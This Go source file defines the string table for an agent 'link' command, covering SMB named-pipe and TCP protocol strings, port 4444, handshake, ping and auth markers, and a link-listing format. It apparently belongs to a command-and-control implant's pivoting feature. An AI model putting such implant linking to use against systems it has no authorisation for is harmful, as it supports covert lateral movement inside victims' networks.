// internal/templates/link.go
package templates

// GetLinkTemplate returns the link command template for agents
func GetLinkTemplate() *CommandTemplate {
	tpl := make([]string, MaxTemplateSize)

	// Protocol identifiers
	tpl[IdxLinkProtoSmb] = "smb"
	tpl[IdxLinkProtoTcp] = "tcp"

	// UNC path components
	tpl[IdxLinkUncSlashes] = "\\\\"
	tpl[IdxLinkPipePath] = "\\pipe\\"

	// Network defaults
	tpl[IdxLinkLocalhost] = "localhost"
	tpl[IdxLinkLoopback] = "127.0.0.1"
	tpl[IdxLinkDefaultPort] = "4444"

	// Output markers
	tpl[IdxLinkStatusPrefix] = "S6|"
	tpl[IdxLinkPingMarker] = "P"
	tpl[IdxLinkQuitMarker] = "Q"

	// Actions
	tpl[IdxLinkActionStart] = "start"
	tpl[IdxLinkActionStop] = "stop"

	// Misc
	tpl[IdxLinkDot] = "."

	// Link manager protocol strings (JSON keys/values for inter-agent communication)
	tpl[IdxLinkKeyType] = "type"
	tpl[IdxLinkKeyPayload] = "payload"
	tpl[IdxLinkMsgData] = "data"
	tpl[IdxLinkMsgDisconn] = "disconnect"
	tpl[IdxLinkMsgHandshake] = "handshake"
	tpl[IdxLinkMsgPing] = "ping"
	tpl[IdxLinkMsgPong] = "pong"

	// Link manager display/auth strings
	tpl[IdxLinkStatusActive] = "active"
	tpl[IdxLinkStatusInact] = "inactive"
	tpl[IdxLinkAuthPrefix] = "AUTH:"
	tpl[IdxLinkAuthOK] = "OK"
	tpl[IdxLinkFmtList] = "Active Links (%d):\n"
	tpl[IdxLinkFmtRow] = "  [%s] %s - %s (connected: %s, last seen: %s)\n"
	tpl[IdxLinkTimeFmt] = "15:04:05"

	return &CommandTemplate{
		Version:   2,
		Type:      TypeLink,
		Templates: tpl,
		Params:    []string{},
	}
}
